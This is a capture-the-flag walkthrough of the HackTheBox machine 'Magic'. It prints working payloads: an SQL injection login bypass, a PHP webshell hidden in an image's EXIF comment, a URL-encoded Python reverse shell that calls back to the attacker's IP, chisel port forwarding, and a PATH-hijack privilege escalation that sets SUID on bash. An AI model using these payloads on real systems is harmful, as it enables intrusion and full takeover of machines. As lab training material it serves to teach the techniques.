# HackTheBox
------------------------------------
### IP: 10.129.64.156
### Name: Magic
### Difficulty: Medium
--------------------------------------------

Magic.png

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/Magic]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV -oN nmap.txt 10.129.64.156
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-27 09:12 CDT
Nmap scan report for 10.129.64.156
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06d489bf51f7fc0cf9085e9763648dca (RSA)
|   256 11a69298ce3540c729094f6c2d74aa66 (ECDSA)
|_  256 7105991fa81b14d6038553f8788ecb88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.59 seconds
```

Looking at the site on port 80 we find several pictures and GIFs, and notice a login link at the bottom of the page, mentioning we can upload photos:

htb_magic_site.png

Following the link we find a simple login page:

htb_magic_login.png

While we play with this lets kick off some directory fuzzing:

```
┌──(ryan㉿kali)-[~/HTB/Magic]
└─$ feroxbuster --url http://10.129.64.156 -q -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php html zip txt -o 80_dirs.txt
```

Trying different common passwords yielded nothing, bt we were able to successfully authenticate with a SQL injection login bypass ` admin' or '1'='1'#`

Trying to upload a web shell we get the error:

htb_magic_sorry.png

Grabbing a copy of PentestMonkey's php-reverse-shell.php and adding the .png magic bytes to the top (`GIF89a;`) and renaming the file shell.php.png:

```
┌──(ryan㉿kali)-[~/HTB/Magic]
└─$ mv php-reverse-shell.php shell.php.png
```

Gets me this error:

htb_magic_what.png

Lets try a different approach. 

### Exploitation/ Foothold

I'll download a picture of a dog from Google, rename the image dog.php.jpg and use exiftool to write a comment to the image containing a simple php webshell:

htb_magic_google.png

```
┌──(ryan㉿kali)-[~/HTB/Magic]
└─$ mv dog.jpg dog.php.jpg    
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Magic]
└─$  exiftool -Comment='<?php system($_GET['cmd']); ?>' dog.php.jpg 
    1 image files updated
```

I find we can successfully upload this file.

htb_magic_uploaded.png

But where is it uploaded to?

Going back to our directory fuzzing output:

htb_magic_dirs.png

We find we can confirm code execution with: http://10.129.64.156/images/uploads/dog.php.jpg?cmd=id

htb_magic_confirm.png

Interestingly, it appears the file gets scrubbed quickly, because a minute or two later the same request yields a 404 not found error. 

This explains why I was having an issue originally accessing the web shell at `/images/uploads`

Lets set up a netcat listener, upload the file again, and issue a URL encoded reverse shell one-liner from revshells.com, all before our file gets scrubbed.

```
http://10.129.64.156/images/uploads/dog.php.jpg?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.138%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27
```

This catches us a shell back as www-data:

```
┌──(ryan㉿kali)-[~/HTB/Magic]
└─$ nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.14.138] from (UNKNOWN) [10.129.64.156] 41288
www-data@ubuntu:/var/www/Magic/images/uploads$ whoami
whoami
www-data
www-data@ubuntu:/var/www/Magic/images/uploads$ hostname
hostname
ubuntu
```

We can stabilize the shell then try accessing the user.txt flag:

```
www-data@ubuntu:/home/theseus$ cat user.txt
cat: user.txt: Permission denied
```

Ok, looks like we'll need to upgrade to user theseus to access this. 

Looking around the box we find some credentials in `/var/www/Magic/db.php5`

htb_magic_creds.png

Unfortunately for us we can't just use these to `su theseus`:

```
www-data@ubuntu:/var/www/Magic$ su theseus
Password: 
su: Authentication failure
```

Trying to authenticate to the db with these creds we find:

```
www-data@ubuntu:/var/www/Magic$ mysql -u theseus -piamkingtheseus

Command 'mysql' not found, but can be installed with:

apt install mysql-client-core-5.7   
apt install mariadb-client-core-10.1

Ask your administrator to install one of them.
```

We can confirm that mysql port 3306 is open internally on the target:

```
www-data@ubuntu:/var/www/Magic$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
```

Lets set up some port forwarding so we can access the DB from our attacking machine:

On kali:

```
┌──(ryan㉿kali)-[~/Tools/pivoting]
└─$ ./chisel_1.8.1_linux_arm64 server -p 8888 --reverse
```

And on the target:
```
./chisel_1.8.1_linux_amd64 client 10.10.14.138:8888 R:3306:127.0.0.1:3306
```

We can then access the DB from kali:

```
┌──(ryan㉿kali)-[~/HTB/Magic]
└─$ mysql -h 127.0.0.1 -u theseus -piamkingtheseus  
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 15
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Magic              |
+--------------------+
2 rows in set (0.068 sec)

MySQL [(none)]> use Magic;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [Magic]> show tables;
+-----------------+
| Tables_in_Magic |
+-----------------+
| login           |
+-----------------+
1 row in set (0.073 sec)

MySQL [Magic]> select * from login;
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
|  1 | admin    | Th3s3usW4sK1ng |
+----+----------+----------------+
1 row in set (0.069 sec)
```

Cool, we have a new credential.

Going back to our shell we find we can now `su theseus`:

```
www-data@ubuntu:/tmp$ whoami
www-data
www-data@ubuntu:/tmp$ su theseus
Password: 
theseus@ubuntu:/tmp$ whoami
theseus
```

We can now access the user.txt flag:

htb_magic_user_flag.png

### Privilege Escalation

Loading linpeas onto the target we find an unknown SUID binary `/bin/sysinfo`

htb_magic_SUID.png

Lets take a look at the permissions:

```
theseus@ubuntu:/tmp$ ls -la /bin/sysinfo
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
```

Running the binary we see it does exactly what we'd expect, print out system information:

htb_magic_run.png

Running strings against the binary we can see it is using `lshw` without providing the absolute PATH:

htb_magic_strings.png

Lets create our own `lshw` that sets the SUID bit on `/bin/bash` in the `/temp` directory:

```
theseus@ubuntu:/tmp$ cat >> lshw
/bin/chmod 4755 /bin/bash
^C
theseus@ubuntu:/tmp$ chmod +x lshw 
```

We can then update the PATH:

```
export PATH=/tmp:$PATH
```

```
theseus@ubuntu:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Now lets run `/bin/systeminfo` from `/tmp`, which should execute our malicious `lshw` and set the SUID on `/bin/bash`

```
theseus@ubuntu:/tmp$ /bin/sysinfo
```

Once the script runs we can enter a root shell with:

```
theseus@ubuntu:/tmp$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# id
uid=1000(theseus) gid=1000(theseus) euid=0(root) groups=1000(theseus),100(users)
```

We can now grab the root.txt flag:

htb_magic_root_flag.png

Thanks for following along!

-Ryan

--------------------------------------------


